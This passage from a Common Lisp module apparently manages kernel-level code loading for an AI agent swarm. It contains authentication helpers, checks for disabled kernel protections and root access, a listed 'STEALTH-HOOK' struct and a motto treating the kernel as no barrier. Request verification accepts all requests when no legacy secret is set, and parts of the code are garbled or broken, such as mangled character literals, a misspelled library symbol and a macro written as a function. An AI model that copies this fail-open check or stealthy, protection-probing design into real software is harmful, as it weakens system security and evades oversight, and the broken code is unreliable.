        (format *trace-output* "~&[KERNEL] HMAC key derived (~A bytes)~%"
                (length derived-key)))
      derived-key)))

(defun set-kernel-auth-secret (secret-or-handle)
  "Set the kernel authentication secret or TPM handle.

This function accepts either:
  - A byte vector or string: treated as a raw secret (legacy mode).
    The secret is passed through PBKDF2 to derive the final key.
    WARNING: Raw secrets are visible in memory. Use TPM handles instead.
  - An integer: treated as a TPM NV index handle. The secret is read
    from TPM NVRAM and never loaded into userland memory.

For production deployments, always use a TPM handle:
  (set-kernel-auth-secret #x01C10100)

For testing without a TPM, a raw string can be used:
  (set-kernel-auth-secret "test-secret")

Parameters:
  SECRET-OR-HANDLE -- Byte vector, string, or integer (TPM NV index).

Returns: The derived key byte vector, or NIL if setting failed.

Example:
  (set-kernel-auth-secret #x01C10100)     ; TPM mode (preferred)
  (set-kernel-auth-secret "my-secret")    ; Legacy mode (testing only)"
  (bt:with-lock-held (*kernel-auth-derivation-lock*)
    (cond
      ;; Case 1: Integer -- treat as TPM NV index
      ((integerp secret-or-handle)
       (setf *kernel-auth-tpm-handle* secret-or-handle)
       (derive-hmac-key-from-tpm secret-or-handle))
      ;; Case 2: String -- convert to bytes and derive
      ((stringp secret-or-handle)
       (format *trace-output* "~&[KERNEL] WARNING: Using raw string secret. ~
               Consider using a TPM NV index for production.~%")
       (let ((derived (pbkdf2-derive-key secret-or-handle
                                         "lispmind-kernel-salt-v1"
                                         :iterations 100000
                                         :key-length 32)))
         (setf *kernel-auth-secret-derived* derived)
         derived))
      ;; Case 3: Byte vector -- use directly as key material
      ((and (vectorp secret-or-handle)
            (equal (array-element-type secret-or-handle)
                   '(unsigned-byte 8)))
       (let ((derived (pbkdf2-derive-key secret-or-handle
                                         "lispmind-kernel-salt-v1"
                                         :iterations 100000
                                         :key-length 32)))
         (setf *kernel-auth-secret-derived* derived)
         derived))
      ;; Unknown type
      (t
       (format *trace-output* "~&[KERNEL] ERROR: Invalid auth secret type: ~A~%"
               (type-of secret-or-handle))
       nil))))

(defun clear-kernel-auth-secret ()
  "Securely wipe the derived HMAC key from memory.

Overwrites *KERNEL-AUTH-SECRET-DERIVED* with random bytes before
setting it to NIL. This ensures the key material is not left in
memory after use. Also clears *KERNEL-AUTH-TPM-HANDLE*.

This should be called:
  - Before setting a new secret (to clear old material)
  - On graceful shutdown
  - When the agent is being deactivated

Returns: T if a secret was cleared, NIL if no secret was present.

Example:
  (clear-kernel-auth-secret)"
  (bt:with-lock-held (*kernel-auth-derivation-lock*)
    (when *kernel-auth-secret-derived*
      ;; Overwrite with random bytes before freeing
      (dotimes (i (length *kernel-auth-secret-derived*))
        (setf (aref *kernel-auth-secret-derived* i)
              (random 256)))
      (setf *kernel-auth-secret-derived* nil
            *kernel-auth-tpm-handle* nil)
      (format *trace-output* "~&[KERNEL] Auth secret securely cleared~%")
      t)))

;; ============================================================================
;; Section 10: Authentication Helpers
;; ============================================================================
;; ============================================================================
;; Section 10: Authentication Helpers
;; ============================================================================
;; Simple HMAC-based authentication for kernel load requests.
;; In production, this would use the swarm's shared secret from a
;; secure key distribution system.

(defvar *kernel-auth-secret* nil
  "The swarm's shared authentication secret (LEGACY -- use TPM path instead).

DEPRECATED: This variable stores the raw authentication secret in
userland memory, which is visible to memory forensics. For production
deployments, use SET-KERNEL-AUTH-SECRET with a TPM NV index handle
instead. The TPM path stores the secret in TPM NVRAM and derives the
key on-demand via DERIVE-HMAC-KEY-FROM-TPM.

This variable is retained for backward compatibility and testing.
If *KERNEL-AUTH-SECRET-DERIVED* is available (TPM path), it takes
precedence over this variable.

Example (legacy, NOT recommended for production):
  (setf *kernel-auth-secret* (ironclad:ascii-string-to-byte-array \"your-secret-here\"))

Example (TPM path, recommended):
  (set-kernel-auth-secret #x01C10100)")

(defun generate-request-auth (request-id agent-id)
  "Generate an HMAC authentication token for a kernel load request.

Creates a keyed-HMAC of the request fields. The key is sourced in
priority order:
  1. *KERNEL-AUTH-SECRET-DERIVED* -- TPM-derived key (preferred)
  2. *KERNEL-AUTH-SECRET*         -- Legacy raw secret (fallback)
  3. Stub mode                     -- Placeholder (no secret configured)

The TPM-derived path (option 1) ensures the raw secret never resides
in Lisp-accessible memory. See DERIVE-HMAC-KEY-FROM-TPM.

Parameters:
  REQUEST-ID -- Symbol, unique request identifier.
  AGENT-ID   -- Symbol, the requesting agent's ID.

Returns: String, the HMAC hex digest.

Stub Mode: If no secret is configured, returns a placeholder."
  ;; Ensure we have a derived key (auto-derive if TPM handle is set)
  (when (and (null *kernel-auth-secret-derived*)
             *kernel-auth-tpm-handle*)
    (derive-hmac-key-from-tpm))
  ;; Now generate HMAC with available key
  (if (and (find-package :ironclad)
           (or *kernel-auth-secret-derived* *kernel-auth-secret*))
      ;; Use Ironclad for real HMAC
      (let ((message (format nil "~A:~A:~A"
                             request-id
                             agent-id
                             (local-time:now)))
            ;; Prefer TPM-derived key, fall back to legacy secret
            (key-material (or *kernel-auth-secret-derived*
                              *kernel-auth-secret*)))
        (princ-to-string
         (funcall (find-symbol "BYTE-ARRAY-TO-HE-STRING" :ironclad)
                  (funcall (find-symbol "HMAC-DIGEST" :ironclad)
                           (funcall (find-symbol "MAKE-HMAC" :ironclad)
                                    key-material
                                    (funcall (find-symbol "MAKE-DIGEST" :ironclad)
                                             :SHA256))
                           message))))
      ;; Stub mode: return a simple hash
      (format nil "STUB-AUTH-~A" (sxhash (list request-id agent-id
                                               (get-universal-time))))))

(defun verify-request-auth (auth-token request-id agent-id)
  "Verify an HMAC authentication token.

Recomputes the expected HMAC for the given request fields and compares
it with the provided token. Returns T if they match, NIL otherwise.

Parameters:
  AUTH-TOKEN -- String, the token from the request.
  REQUEST-ID -- Symbol, the request identifier.
  AGENT-ID   -- Symbol, the requesting agent's ID.

Returns: T if token is valid, NIL otherwise.

Stub Mode: Always returns T (authentication disabled in stub mode)."
  (if (and (find-package :ironclad)
           *kernel-auth-secret*)
      (string= auth-token
               (generate-request-auth request-id agent-id))
      ;; Stub mode: accept all requests
      t))

;; ============================================================================
;; Section 11: Utility Functions
;; ============================================================================
;; Helper functions used throughout the kernel orchestrator.

(defun kernel-protection-disabled-p (protection os)
  "Check if a specific kernel protection is disabled.

Queries the target system (via Rust FFI or shell commands) to determine
if a specific kernel-level protection mechanism is disabled.

Parameters:
  PROTECTION -- Keyword: :SMEP :SMAP :DSE :SECURE-BOOT :SELINUX :APPARMOR.
  OS         -- Keyword: :LINUX :WINDOWS.

Returns: T if protection is confirmed disabled, NIL otherwise.

Note: This function errs on the side of caution -- if it cannot
determine the protection status, it returns NIL (assumes protection
is ENABLED). This prevents failed deployments on hardened systems."
  (case os
    (:linux
     (case protection
       (:smep
        ;; Check /proc/cpuinfo for smep flag
        (not (string-match-in-file "/proc/cpuinfo" "smep")))
       (:smap
        (not (string-match-in-file "/proc/cpuinfo" "smap")))
       (:selinux
        ;; Check if SELinux is enforcing
        (let ((status (ignore-errors
                        (uiop:run-program "getenforce" :output :string))))
          (and status (string-equal (string-trim '(#
ewline #	ab #\space) status)
                                    "Permissive"))))
       (:apparmor
        ;; Check if AppArmor is enabled
        (let ((status (ignore-errors
                        (uiop:run-program "aa-status --enabled 2>/dev/null || echo disabled"
                                          :output :string))))
          (and status (search "disabled" status))))
       (:secure-boot
        ;; Check mokutil
        (let ((status (ignore-errors
                        (uiop:run-program "mokutil --sb-state 2>/dev/null || echo SecureBoot enabled"
                                          :output :string))))
          (and status (search "SecureBoot disabled" status))))
       (otherwise
        (format *trace-output* "~&[KERNEL] Unknown Linux protection: ~A~%" protection)
        nil)))
    (:windows
     (case protection
       (:dse
        ;; Check Driver Signature Enforcement via bcdedit
        (let ((status (ignore-errors
                        (uiop:run-program "bcdedit /enum | findstr nointegritychecks"
                                          :output :string))))
          (and status (search "Yes" status))))
       (:secure-boot
        ;; Check via Confirm-SecureBootUEFI PowerShell
        nil)  ;; Would need PowerShell execution
       (otherwise
        (format *trace-output* "~&[KERNEL] Unknown Windows protection: ~A~%" protection)
        nil)))
    (otherwise
     (format *trace-output* "~&[KERNEL] Cannot check protections for OS: ~A~%" os)
     nil)))

(defun has-capability-p (capability os)
  "Check if the current process has a specific Linux capability.

Parameters:
  CAPABILITY -- Keyword: :SYS-ADMIN :SYS-PTRACE :NET-ADMIN :SYS-RAW-IO.
  OS         -- Keyword (should be :LINUX).

Returns: T if capability is present, NIL otherwise."
  (declare (ignorable capability os))
  ;; Check /proc/self/status for CapEff
  (handler-case
      (let ((cap-eff (uiop:run-program
                      "grep '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}'"
                      :output :string
                      :ignore-error-status t)))
        (when (and cap-eff (> (length cap-eff) 0))
          ;; CapEff is a hex bitmask. CAP_SYS_ADMIN is bit 21.
          (let ((cap-mask (parse-integer (string-trim '(#
ewline #	ab #\space) cap-eff)
                                         :radix 16
                                         :junk-allowed t)))
            (and cap-mask
                 (case capability
                   (:sys-admin  (logbitp 21 cap-mask))
                   (:sys-ptrace (logbitp 19 cap-mask))
                   (:net-admin  (logbitp 12 cap-mask))
                   (:sys-raw-io (logbitp 17 cap-mask))
                   (otherwise nil))))))
    (error (e)
      (format *trace-output* "~&[KERNEL] Capability check error: ~A~%" e)
      nil)))

(defun has-root-access-p (os)
  "Check if the current process has root/administrator access.

Parameters:
  OS -- Keyword: :LINUX :WINDOWS.

Returns: T if running as root/admin, NIL otherwise."
  (case os
    (:linux
     (= 0 (sb-posix:getuid)))
    (:windows
     ;; Check if running as Administrator
     (handler-case
         (let ((result (uiop:run-program
                        "net session 2>/dev/null || echo NOT_ADMIN"
                        :output :string
                        :ignore-error-status t)))
           (not (search "NOT_ADMIN" result)))
       (error nil)))
    (otherwise nil)))

(defun string-match-in-file (filepath pattern)
  "Check if a file contains a string pattern.

Parameters:
  FILEPATH -- String, path to the file.
  PATTERN  -- String, the pattern to search for.

Returns: T if pattern found, NIL otherwise."
  (handler-case
      (with-open-file (stream filepath :direction :input)
        (loop for line = (read-line stream nil nil)
              while line do
          (when (search pattern line)
            (return t))))
    (error nil)))

(defun gossip-publish (topic payload)
  "Publish a message to the gossip mesh.

Thin wrapper around the gossip system's publish function. If the gossip
system is not available, the message is logged to *TRACE-OUTPUT* instead.

Parameters:
  TOPIC   -- String, the gossip topic.
  PAYLOAD -- Any Lisp object (must be PRINT-READABLE).

Returns: T if published, NIL if gossip system unavailable."
  (handler-case
      (if (and (boundp '*gossip-publisher*)
               *gossip-publisher*
               *gossip-running-p*)
          ;; Real gossip publish
          (let ((message (make-gossip-message
                          :topic topic
                          :sender-id (or (when (boundp '**current-agent-id**)
                                           **current-agent-id**)
                                         'kernel-orchestrator)
                          :timestamp (local-time:now)
                          :payload payload)))
            (funcall (find-symbol "PUBLISH-MESSAGE" :lispmind)
                     topic
                     (serialize-message message))
            t)
          ;; Gossip not available -- log to trace output
          (progn
            (format *trace-output* "~&[KERNEL-GOSSIP] ~A: ~S~%" topic payload)
            nil))
    (error (e)
      (format *trace-output* "~&[KERNEL] Gossip publish error: ~A~%" e)
      nil)))

(defun hash-table-keys (hash-table)
  "Return a list of all keys in a hash table.

Parameters:
  HASH-TABLE -- The hash table to extract keys from.

Returns: Fresh list of keys."
  (let ((keys '()))
    (maphash (lambda (k v)
               (declare (ignore v))
               (push k keys))
             hash-table)
    (reverse keys)))

(defun clamp (value min max)
  "Clamp a value to the range [MIN, MAX].

Parameters:
  VALUE -- Number to clamp.
  MIN   -- Minimum allowed value.
  MAX   -- Maximum allowed value.

Returns: VALUE clamped to [MIN, MAX]."
  (cond
    ((< value min) min)
    ((> value max) max)
    (t value)))

(defun plistp (obj)
  "Check if an object is a plist (property list).

A plist is a list with an even number of elements where every even-indexed
element (0-based) is a keyword.

Parameters:
  OBJ -- Object to check.

Returns: T if OBJ is a plist, NIL otherwise."
  (and (listp obj)
       (evenp (length obj))
       (every (lambda (x) (keywordp x))
              (loop for i from 0 below (length obj) by 2
                    collect (nth i obj)))))

(defun doplist ((key value) plist &body body)
  "Iterate over a plist, binding KEY and VALUE for each pair.

Parameters:
  (KEY VALUE) -- Variable names for iteration.
  PLIST       -- The property list to iterate over.
  &BODY       -- Forms to execute for each pair.

Example:
  (doplist (k v) '(:a 1 :b 2)
    (format t \"~A = ~A~%\" k v))"
  (let ((g!-plist (gensym "PLIST-")))
    `(do ((,g!-plist ,plist (cddr ,g!-plist)))
         ((null ,g!-plist))
       (let ((,key (car ,g!-plist))
             (,value (cadr ,g!-plist)))
         ,@body))))

;; ============================================================================
;; Section 12: Initialization
;; ============================================================================
;; Auto-initialize the kernel toolchain registry at load time.

(eval-when (:load-toplevel :execute)
  ;; Load the default kernel toolchain
  (let ((count (load-kernel-toolchain-registry)))
    (format *trace-output* "~&[KERNEL] Kernel orchestrator v~A loaded. ~D tools registered.~%"
            *kernel-orchestrator-version* count))
  ;; Check for Rust FFI availability
  (handler-case
      (progn
        ;; Try to load the Rust shared library
        (require :cffi nil)
        (when (find-package :cffi)
          ;; Would try to load the library here
          ;; (cffi:load-foreign-library "librust_kernel_bridge.so")
          (setf *kernel-rust-ffi-available-p* nil)  ;; Set to T when library is available
          (format *trace-output* "~&[KERNEL] Rust FFI bridge check complete.~%")))
    (error ()
      (setf *kernel-rust-ffi-available-p* nil)
      (format *trace-output* "~&[KERNEL] Rust FFI bridge not available. Running in stub mode.~%~
              Install Rust bridge: cd rust-bridge && cargo build --release~%")))
  ;; Register gossip topic callback for kernel responses
  (handler-case
      (register-topic *kernel-telemetry-topic* #'handle-kernel-load-response)
    (error (e)
      (format *trace-output* "~&[KERNEL] Could not register gossip callback: ~A~%" e))))

;;; ============================================================================
;;;                            END OF FILE
;;; ============================================================================
;;;
;;; MODULE: kernel-orchestrator.lisp
;;; VERSION: 2.5.0
;;; PACKAGE: LISPMIND (nickname MIND)
;;;
;;; Kernel-Level Agent Management for LISPMIND v2.5
;;;
;;; Classes:     KERNEL-AGENT
;;; Structs:     KERNEL-TOOL-ENTRY, KERNEL-LOAD-REQUEST, KERNEL-LOAD-RESPONSE,
;;;              STEALTH-HOOK
;;; Functions:   50+ (see full listing in source)
;;;
;;; "The kernel is not a barrier. It is an API. The swarm speaks it fluently."

)